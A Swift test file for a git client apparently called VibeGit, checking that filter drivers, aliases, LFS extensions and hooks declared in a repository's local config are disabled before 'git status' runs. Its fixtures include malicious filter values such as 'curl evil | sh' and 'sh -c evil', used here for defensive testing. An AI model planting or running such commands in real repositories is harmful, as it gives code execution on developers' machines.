import Foundation
import Testing

@testable import VibeGit

@Suite("What a repository's own configuration could make git status run")
struct FilterConfigurationTests {
  private func output(_ records: [(String, String, String?)]) -> Data {
    var data = Data()
    for (scope, key, value) in records {
      data.append(Data("\(scope)\0\(key)".utf8))
      if let value { data.append(Data("\n\(value)".utf8)) }
      data.append(0)
    }
    return data
  }

  private func pairs(_ configuration: FilterConfiguration) -> [String] {
    configuration.neutralizations.map { "\($0.key)=\($0.value)" }
  }

  @Test("Git's records are read with their scope, key and value")
  func parse() {
    let configuration = FilterConfiguration.parse(
      output([
        ("local", "filter.evil.clean", "sh -c 'x'"), ("local", "filter.evil.required", nil),
      ]))

    #expect(
      configuration.entries == [
        .init(scope: "local", key: "filter.evil.clean", value: "sh -c 'x'"),
        .init(scope: "local", key: "filter.evil.required", value: nil),
      ])
  }

  @Test("The user's own filters stay, and the repository's go unless they repeat the user's")
  func whichDrivers() {
    let configuration = FilterConfiguration.parse(
      output([
        ("global", "filter.lfs.clean", "git-lfs clean -- %f"),
        ("global", "filter.lfs.process", "git-lfs filter-process"),
        ("local", "filter.lfs.clean", "git-lfs clean -- %f"),
        ("local", "filter.lfs.process", "git-lfs filter-process"),
        ("local", "filter.evil.clean", "curl evil | sh"),
        ("worktree", "filter.other.smudge", "x"),
        ("local", "filter.Ev.il.process", "y"),
        ("local", "filter.we=ird.clean", "z"),
        ("local", "filter..clean", "empty name"),
        ("local", "filter.inert.required", "true"),
        ("global", "filter.media.clean", "git media clean %f"),
      ]))

    #expect(configuration.driversToNeutralize == ["", "Ev.il", "evil", "other", "we=ird"])
  }

  @Test("A local filter that changes the user's command is switched off")
  func changedCommand() {
    let configuration = FilterConfiguration.parse(
      output([
        ("global", "filter.lfs.clean", "git-lfs clean -- %f"),
        ("local", "filter.lfs.clean", "sh -c evil"),
      ]))

    #expect(configuration.driversToNeutralize == ["lfs"])
  }

  @Test("A driver gets an empty clean, smudge and process, and is no longer required")
  func driverPairs() {
    let configuration = FilterConfiguration.parse(output([("local", "filter.x.smudge", "y")]))

    #expect(
      pairs(configuration) == [
        "filter.x.clean=", "filter.x.smudge=", "filter.x.process=", "filter.x.required=false",
      ])
  }

  @Test("The repository's aliases and Git LFS extensions are emptied, the user's kept")
  func aliasesAndExtensions() {
    let configuration = FilterConfiguration.parse(
      output([
        ("local", "alias.media", "!evil"), ("global", "alias.st", "status"),
        ("local", "lfs.extension.evil.clean", "evil %f"),
        ("global", "lfs.extension.mine.clean", "mine %f"),
      ]))

    #expect(pairs(configuration) == ["alias.media=", "lfs.extension.evil.clean="])
  }

  @Test("The hooks the repository declares by name are disabled, the user's kept")
  func configuredHooks() {
    let configuration = FilterConfiguration.parse(
      output([
        ("local", "hook.evil.command", "evil"), ("local", "hook.evil.event", "pre-commit"),
        ("worktree", "hook.other.command", "other"), ("global", "hook.mine.command", "mine"),
      ]))

    #expect(pairs(configuration) == ["hook.evil.enabled=false", "hook.other.enabled=false"])
  }

  @Test("A key without a subsection names no driver or hook")
  func noSubsection() {
    #expect(FilterConfiguration.driver(of: "filter.clean") == nil)
    #expect(FilterConfiguration.driver(of: "filter..clean") == "")
    #expect(FilterConfiguration.driver(of: "filter.a.b.process") == "a.b")
    #expect(FilterConfiguration.driver(of: "filter.a.required") == nil)
    #expect(FilterConfiguration.hook(of: "hook.command") == nil)
    #expect(FilterConfiguration.hook(of: "hook.a.command") == "a")
  }

  @Test("Pairs reach Git through GIT_CONFIG_*, which takes any name")
  func environment() {
    let environment = FilterConfiguration.environment(for: [
      ("filter.we=ird.clean", ""), ("filter.we=ird.required", "false"),
    ])

    #expect(environment["GIT_CONFIG_COUNT"] == "2")
    #expect(environment["GIT_CONFIG_KEY_0"] == "filter.we=ird.clean")
    #expect(environment["GIT_CONFIG_VALUE_0"] == "")
    #expect(environment["GIT_CONFIG_KEY_1"] == "filter.we=ird.required")
    #expect(environment["GIT_CONFIG_VALUE_1"] == "false")
    #expect(FilterConfiguration.environment(for: []).isEmpty)
  }

  @Test("Only status reads the working tree, and only it is guarded")
  func statusIndex() {
    #expect(ProcessGitCommandRunner.statusIndex(in: ["status", "-z"]) == 0)
    #expect(ProcessGitCommandRunner.statusIndex(in: ["--no-optional-locks", "status"]) == 1)
    #expect(ProcessGitCommandRunner.statusIndex(in: ["rev-parse", "status"]) == nil)
    #expect(ProcessGitCommandRunner.statusIndex(in: ["--no-optional-locks", "diff"]) == nil)
  }

  @Test("No command fetches a missing object from a remote")
  func noLazyFetch() {
    #expect(ProcessGitCommandRunner.environment(inheriting: [:])["GIT_NO_LAZY_FETCH"] == "1")
  }
}
